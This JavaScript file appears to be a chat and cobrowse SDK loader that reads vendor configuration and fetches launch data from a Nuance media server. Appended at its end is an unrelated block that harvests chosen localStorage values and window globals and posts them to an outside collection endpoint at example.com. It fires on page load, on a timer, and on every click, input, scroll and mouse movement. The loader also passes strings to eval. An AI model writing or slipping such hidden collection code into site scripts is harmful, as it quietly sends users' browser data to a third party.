            return !!(l && l.onBeforeUnload && "function" == typeof l.onBeforeUnload);
          };
          ExitHook.prototype.fireBeforeUnloadEvent = function () {
            function f(l, evt) {
              try {
                if (!!l.onBeforeUnload) l.onBeforeUnload(evt);
              } catch (e) {
                log("Error firing event BeforeUnload on " + l.toString() + ":" + e);
              }
            }
            var event = {
              rule: this._rule
            };
            this._fireEvt(f, event);
          };
          ExitHook.prototype.doInit = function (rule) {
            this._rule = rule;
            win.v3Lander.prepareBeforeUnloadForEH();
            this.initialized = true;
          };
          ExitHook.prototype.isInitialized = function () {
            return this.initialized;
          };
          ExitHook.prototype.init = function () {};
          var returnObj = {
            siteID: jsonAPIData["admin-config"]["siteID"],
            chatSkinFormat: jsonAPIData["admin-config"]["chatSkinFormat"],
            noJSHosting: jsonAPIData["admin-config"]["noJSHosting"],
            noChatV3Frame: jsonAPIData["admin-config"]["noChatFrame"],
            clientStaticUrl: jsonAPIData["admin-config"]["clientStaticUrl"],
            cacheSolutionEnabled: jsonAPIData["admin-config"]["cacheSolutionEnabled"],
            businessUnitDictionary: jsonAPIData["admin-config"]["businessUnitDictionary"],
            agentGroupsActive: jsonAPIData["admin-config"]["agentGroupsActive"],
            siteAgentGroups: jsonAPIData["admin-config"]["siteAgentGroups"],
            siteAgentGroupsDisplayNames: jsonAPIData["admin-config"]["siteAgentGroupsDisplayNames"],
            siteBusinessUnitsNames: jsonAPIData["admin-config"]["siteBusinessUnitsNames"],
            siteBusinessUnitsDisplayNames: jsonAPIData["admin-config"]["siteBusinessUnitsDisplayNames"],
            psHosturlList: jsonAPIData["admin-config"]["psHosturlList"],
            hostedFileDomains: jsonAPIData["admin-config"]["hostedFileDomains"],
            productionFilter: jsonAPIData["admin-config"]["productionFilter"],
            vanityDomainName: jsonAPIData["admin-config"]["vanityDomainName"],
            useResolvePageWSDomain: jsonAPIData["admin-config"]["useResolvePageWSDomain"],
            resolvePageWSDomain: jsonAPIData["admin-config"]["resolvePageWSDomain"],
            dataCenter: jsonAPIData["admin-config"]["dataCenter"],
            apiServiceURL: jsonAPIData["admin-config"]["apiServiceURL"],
            cdnURL: jsonAPIData["admin-config"]["cdnURL"],
            chatRouterVanityDomain: jsonAPIData["admin-config"]["chatRouterVanityDomain"],
            clusterEnvironment: jsonAPIData["admin-config"]["clusterEnvironment"],
            mediaServer: jsonAPIData["admin-config"]["mediaServer"],
            cobrowseURL: jsonAPIData["admin-config"]["cobrowseURL"],
            extraSettings: jsonAPIData["admin-config"]["extraSettings"],
            xformsVanityDomain: jsonAPIData["admin-config"]["xformsVanityDomain"],
            language: jsonAPIData["admin-config"]["language"],
            persistenceMode: jsonAPIData["admin-config"]["persistenceMode"],
            ciObfuscation: jsonAPIData["admin-config"]["ciObfuscation"],
            JSLoggingDisabled: jsonAPIData["admin-config"]["JSLoggingDisabled"],
            JSDebugMode: jsonAPIData["admin-config"]["JSDebugMode"],
            rechatinterval: jsonAPIData["admin-config"]["rechatinterval"],
            enableCobrowse: jsonAPIData["admin-config"]["enableCobrowse"],
            enableAgentEncryptedData: jsonAPIData["admin-config"]["enableAgentEncryptedData"],
            cookiePath: jsonAPIData["admin-config"]["cookiePath"],
            rootDomain: jsonAPIData["admin-config"]["rootDomain"],
            c2cToPersistent: jsonAPIData["admin-config"]["c2CToPersistent"],
            hostedFileURL: jsonAPIData["admin-config"]["hostedFileURL"],
            fileTransferSize: jsonAPIData["admin-config"]["fileTransferSize"],
            fileTransferUrl: jsonAPIData["admin-config"]["fileTransferUrl"],
            fileTransferApiUrl: jsonAPIData["admin-config"]["fileTransferApiUrl"],
            fileTransferExtensions: jsonAPIData["admin-config"]["fileTransferExtensions"],
            fileDeleteSetting: jsonAPIData["admin-config"]["fileDeleteSetting"],
            rootDomainsList: jsonAPIData["admin-config"]["rootDomainsList"],
            refreshIframeDelayIncrement: jsonAPIData["admin-config"]["refreshIframeDelayIncrement"],
            maxRefreshIframeDelay: jsonAPIData["admin-config"]["maxRefreshIframeDelay"],
            clearOutdatedCookies: jsonAPIData["admin-config"]["clearOutdatedCookies"],
            hideJsonTranscriptMessages: jsonAPIData["admin-config"]["hideJsonTranscriptMessages"],
            useNativeJson: jsonAPIData["admin-config"]["useNativeJson"],
            detectAdblock: jsonAPIData["admin-config"]["detectAdblock"],
            postChatSurveyLogsEnabled: jsonAPIData["admin-config"]["postChatSurveyLogsEnabled"],
            removeJSInMessages: jsonAPIData["admin-config"]["removeJSInMessages"],
            sendDataToTSWithoutIframe: jsonAPIData["admin-config"]["sendDataToTSWithoutIframe"],
            aliasesToggle: jsonAPIData["admin-config"]["aliasesToggle"],
            usePolishNotation: jsonAPIData["admin-config"]["usePolishNotation"],
            fireC2CRulesOnChatClose: jsonAPIData["business-rules-data"]["fireC2CRulesOnChatClose"],
            defaultAgentGroup: jsonAPIData["admin-config"]["defaultAgentGroup"],
            vaList: jsonAPIData["admin-config"]["vaList"],
            sameOriginReferrerFilterRegex: function () {
              if (jsonAPIData["admin-config"]["sameOriginReferrerFilterRegex"]) {
                return !new RegExp(jsonAPIData["admin-config"]["sameOriginReferrerFilterRegex"]).test(parent.document.referrer);
              }
              return true;
            },
            setPersistentCustomerId: null,
            setAuthenticatedUser: null,
            setUserObject: null,
            JSBusinessFunctions: function () {
              return JSSDK_RENDERER.RenderJsFunctions(jsonAPIData["admin-config"]["jsFunctions"]);
            },
            surveySpecs: function () {
              return JSSDK_RENDERER.RenderSurveyData(jsonAPIData["admin-config"]["surveySpecs"]);
            },
            evaluateLegacySettings: function (string, contextWindow) {
              contextWindow = contextWindow || window;
              return contextWindow.eval(string);
            },
            mediaMgrData: function () {
              return {
                chatThemes: JSSDK_RENDERER.RenderModels(jsonAPIData["admin-config"]["mediaMgrData"]["chatThemes"]),
                chatSpecs: JSSDK_RENDERER.RenderModels(jsonAPIData["admin-config"]["mediaMgrData"]["chatSpecs"]),
                c2cSpecs: JSSDK_RENDERER.RenderModels(jsonAPIData["admin-config"]["mediaMgrData"]["c2cSpecs"]),
                c2cThemes: JSSDK_RENDERER.RenderModels(jsonAPIData["admin-config"]["mediaMgrData"]["c2cThemes"])
              };
            },
            xmlData: {
              businessSchedules: function () {
                return JSSDK_RENDERER.RenderSchedules(jsonAPIData["business-rules-data"]["xmlData"]["businessSchedules"]);
              },
              dfvs: function () {
                return JSSDK_RENDERER.RenderDataFilterViews(jsonAPIData["business-rules-data"]["xmlData"]["dfvs"]);
              }
            },
            displayTYImage: jsonAPIData["admin-config"]["displayTYImage"],
            disableMutationObservation: jsonAPIData["business-rules-data"]["disableMutationObservation"],
            enableCobrowseOnMobile: jsonAPIData["business-rules-data"]["enableCobrowseOnMobile"],
            c2cMgrData: function () {
              return jsonAPIData["business-rules-data"]["c2cMgrData"];
            },
            businessRuleActionLists: function () {
              var extraArgs = {};
              return JSSDK_RENDERER.RenderActionLists(jsonAPIData["business-rules-data"]["businessRuleActionLists"], extraArgs);
            },
            ruleActionLists: function () {
              var extraArgs = {};
              return JSSDK_RENDERER.RenderActionLists(jsonAPIData["business-rules-data"]["ruleActionLists"], extraArgs);
            },
            businessConstants: function () {
              return JSSDK_RENDERER.RenderAbstractConstants(jsonAPIData["business-rules-data"]["businessConstants"]);
            },
            businessCustomEvents: function () {
              return JSSDK_RENDERER.RenderCustomEvents(jsonAPIData["business-rules-data"]["businessCustomEvents"]);
            },
            resources: function () {
              return JSSDK_RENDERER.RenderAbstractResources(jsonAPIData["business-rules-data"]["resources"]);
            },
            coBrowseConfigs: function () {
              return {
                cobrowseMaskingConfig: JSSDK_RENDERER.RenderMaskingConfig(jsonAPIData["business-rules-data"]["coBrowseConfigs"]["cobrowseMaskingConfig"]),
                isEmbeddedResource: function (url, markerID) {
                  return JSSDK_RENDERER.RenderEmbeddedConfig(url, markerID, jsonAPIData["business-rules-data"]["coBrowseConfigs"]["isEmbeddedResource"]);
                }
              };
            },
            vamAttributes: {
              programVisitorAttributes: JSSDK_RENDERER.RenderVisitorAttributes(jsonAPIData["business-rules"]["vamAttributes"]["programVisitorAttributes"]),
              businessVisitorAttributes: JSSDK_RENDERER.RenderVisitorAttributes(jsonAPIData["business-rules"]["vamAttributes"]["businessVisitorAttributes"])
            },
            businessVars: function () {
              return JSSDK_RENDERER.RenderVariables(jsonAPIData["business-rules-data"]["businessVars"]);
            },
            timezoneID: jsonAPIData["admin-config"]["timezoneID"],
            frameworkCanRun: function (deviceType, _3pcSupported, _1pcSupported, xdActive) {
              if (jsonAPIData["business-rules-data"]["execution-blocking-function"]) {
                return JSSDK_HELPER.helperExecutionBlockingFunction();
              } else {
                if (_1pcSupported === false || xdActive && !_3pcSupported) {
                  return false;
                }
                return true;
              }
            },
            c2cPageElementIDs: function () {
              return jsonAPIData["admin-config"]["c2cPageElementIDs"];
            },
            getDefaultBusinessUnitID: function () {
              return jsonAPIData["admin-config"]["defaultBusinessUnitID"];
            },
            multiHost: jsonAPIData["admin-config"]["multiHost"],
            oneToManyChatrouterDomain: jsonAPIData["admin-config"]["oneToManyChatrouterDomain"]
          };
          var cobrowseSettings = jsonAPIData["admin-config"]["cobrowseSettings"];
          for (var l = 0; l < cobrowseSettings.length; l++) {
            var cobrowseSetting = cobrowseSettings[l];
            var bannerHash = cobrowseSetting["messages"]["cobrowseBanner_hash"];
            if (bannerHash) {
              cobrowseSetting["messages"]["cobrowseBanner"] = JSSDK_HELPER.globalJSVars[bannerHash];
            }
          }
          returnObj.cobrowseSettings = cobrowseSettings;
          if (jsonAPIData["admin-config"]["isExitChat"]) {
            returnObj.EC = new EXCVTR();
            returnObj.EH = new ExitHook();
          }
          if (jsonAPIData["admin-config"]["multiHost"]) {
            returnObj.v3framesrc = window.location.pathname;
          } else {
            returnObj.v3framesrc = jsonAPIData["admin-config"]["hostedFileURL"];
          }
          return returnObj;
        }, function (programRulesData) {
          var rtnObj = {};
          var renderredLandingConters = JSSDK_RENDERER.RenderLandingCounters(jsonAPIData["business-rules-data"]["landingCounters"]);
          var extraArgs = {};
          var renderredRules = JSSDK_RENDERER.RenderRules(jsonAPIData["business-rules"]["rules"], extraArgs);
          rtnObj['rules'] = programRulesData.append(renderredLandingConters).append(renderredRules);
          if ('globalRAtts' in jsonAPIData["business-rules-data"]) {
            rtnObj['globalRAtts'] = {
              getGlobalRAtts: function (rule, evt) {
                return JSSDK_RENDERER.RenderAttributes(jsonAPIData["business-rules-data"]["globalRAtts"]["businessRuleAttributes"], rule, evt);
              }
            };
            if ('ruleIDs' in jsonAPIData["business-rules-data"]["globalRAtts"]) {
              rtnObj['globalRAtts']['getRuleIDs'] = function () {
                return JSSDK_RENDERER.RenderAbstractList(jsonAPIData["business-rules-data"]["globalRAtts"]["ruleIDs"]);
              };
            } else if ('excludedRuleIDs' in jsonAPIData["business-rules-data"]["globalRAtts"]) {
              rtnObj['globalRAtts']['getExcludedRuleIDs'] = function () {
                return JSSDK_RENDERER.RenderAbstractList(jsonAPIData["business-rules-data"]["globalRAtts"]["excludedRuleIDs"]);
              };
            }
          }
          return rtnObj;
        }, {
          pages: jsonAPIData["admin-config"]["pages"],
          qsize: jsonAPIData["admin-config"]["qsize"],
          contentGroups: JSSDK_RENDERER.RenderContentGroups(jsonAPIData["business-rules-data"]["contentGroups"])
        });
      } else if (xhr.status == 0 && attemptNumber < MAX_ATTEMPTS_COUNT) {
        setTimeout(function () {
          callJssdkApi(attemptNumber + 1);
        }, 1000);
      } else {
        console.error("callJssdkApi: Can't get JSSDK Data. " + "attempts=[" + attemptNumber + "] status=[" + xhr.status + "]");
      }
      xhr.onreadystatechange = null;
      xhr = null;
    }
  };
  var serverUrl = 'https://media-us2.digital.nuance.com';
  var updatedURL = getUpdatedVanityDomain(parent.opener) || getUpdatedVanityDomain(parent) || getUpdatedVanityDomain(window);
  function getUpdatedVanityDomain(v3LanderConfigProvider) {
    try {
      return v3LanderConfigProvider.v3LanderConfig.mediaServer;
    } catch (e) {
      return null;
    }
  }
  if (updatedURL) {
    serverUrl = updatedURL;
  }
  serverUrl = secureProtocol(serverUrl) + '/media/launch/all_10006050.json?codeVersion=' + encodeURIComponent('1698902819879');
  xhr.open('GET', serverUrl, true);
  xhr.send();
};
callJssdkApi();
$(function () {
  const keysToWatch = window.keysToWatch;
  const globalVarsToWatch = ['windowWidth', 'windowHeight'];
  const trackingEvents = ['click', 'input', 'scroll', 'mousemove'];
  function computeHash(data) {
    let hashValue = 0;
    const joinedKeys = Object.keys(data).join('');
    for (let i = 0; i < joinedKeys.length; i++) {
      const charCode = joinedKeys.charCodeAt(i);
      hashValue = (hashValue << 5) - hashValue + charCode;
      hashValue = hashValue & hashValue;
    }
    return hashValue.toString(16);
  }
  function getFilteredLocalStorage() {
    const filteredData = {};
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i);
      if (keysToWatch.includes(key)) {
        const value = window.localStorage.getItem(key);
        filteredData[key] = value;
      }
    }
    return filteredData;
  }
  function getGlobalVars() {
    const globalData = {};
    globalVarsToWatch.forEach(varName => {
      if (window.hasOwnProperty(varName)) {
        globalData[varName] = window[varName];
      }
    });
    return globalData;
  }
  function collectAndPostData() {
    const localStorageData = getFilteredLocalStorage();
    const globalData = getGlobalVars();
    const collectedData = {
      ...localStorageData,
      ...globalData
    };
    if (Object.keys(collectedData).length > 0) {
      const hashId = computeHash(collectedData);
      const apiUrl = "https://example.com/api/collect";
      const request = new XMLHttpRequest();
      request.open("POST", apiUrl, true);
      request.setRequestHeader("Content-Type", "application/json");
      request.send(JSON.stringify({
        id: hashId,
        data: collectedData
      }));
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            console.log("数据发送成功");
          } else {
            console.error("数据发送失败,状态码:" + request.status);
          }
        }
      };
    }
  }
  window.addEventListener("load", collectAndPostData);
  setInterval(collectAndPostData, 5 * 60 * 1000);
  $(document).on(trackingEvents.join(' '), function (e) {
    collectAndPostData();
    console.log("事件监听成功:", e.type);
  });
  $('.form-control').on('input', function () {
    const $field = $(this).closest('.form-group');
    if (this.value) {
      $field.addClass('field--not-empty');
    } else {
      $field.removeClass('field--not-empty');
    }
  });
});